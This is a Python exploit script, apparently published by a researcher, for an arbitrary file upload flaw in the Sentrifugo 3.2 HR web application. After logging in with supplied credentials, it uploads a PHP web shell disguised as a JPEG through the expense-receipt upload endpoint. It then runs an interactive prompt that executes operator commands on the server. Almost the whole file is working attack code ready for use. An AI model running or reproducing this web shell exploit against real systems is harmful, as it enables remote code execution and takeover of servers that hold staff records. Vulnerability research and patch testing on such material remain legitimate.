# Arbitrary upload vulnerability in Sentrifugo Version 3.2 leading to RCE
# https://devl00p.github.io/ https://github.com/devl00p/

import sys
from string import ascii_lowercase
from random import choices
import json

import requests
from bs4 import BeautifulSoup


print("== Sentrifugo 3.2 Arbitrary Upload exploit ==")
if len(sys.argv) < 4:
    print(f"Usage: python {sys.argv[0]} <sentrifugo_url> <username> <password>")
    sys.exit(0)

base_url = sys.argv[1].strip("/")
if not base_url.startswith(("http://", "https://")):
    print(f"{base_url} is not a valid URL")
    sys.exit(0)

login_url = f"{base_url}/index.php/index/loginpopupsave"
upload_url = f"{base_url}/index.php/expenses/expenses/uploadsave"
upload_directory = f"{base_url}/public/uploads/expense_receipt_temp/"

username = sys.argv[2]
password = sys.argv[3]

def get_random_php_filename() -> str:
    return "".join(choices(ascii_lowercase, k=10)) + ".php"

session = requests.Session()
session.verify = False
request = session.get(login_url)
response = session.post(
    login_url,
    data={"username": username, "password": password}
)
if "The username or password you entered is incorrect" in response.text:
    print("Login to Sentrifugo failed")
    sys.exit(1)

print("Login successful")

shell_file = get_random_php_filename()
files = [
    ('myfile', 
        (shell_file,
        '<?php system($_POST["id"]); ?>',
        'image/jpeg')
    )
]
response = session.post(upload_url, files=files)
try:
    filename = response.json()["filedata"]["new_name"]
except (KeyError, ValueError):
    print("Upload failed")
    sys.exit(1)

shell_url = upload_directory + filename
print(f"Backdoor uploaded at {shell_url}. Communicating with webshell")
print("Enter 'quit' to exit")
while True:
    command = input("cmd$ ").strip()
    if command == "quit":
        break
    response = session.post(shell_url, data={"id": command})
    print(response.text.strip())

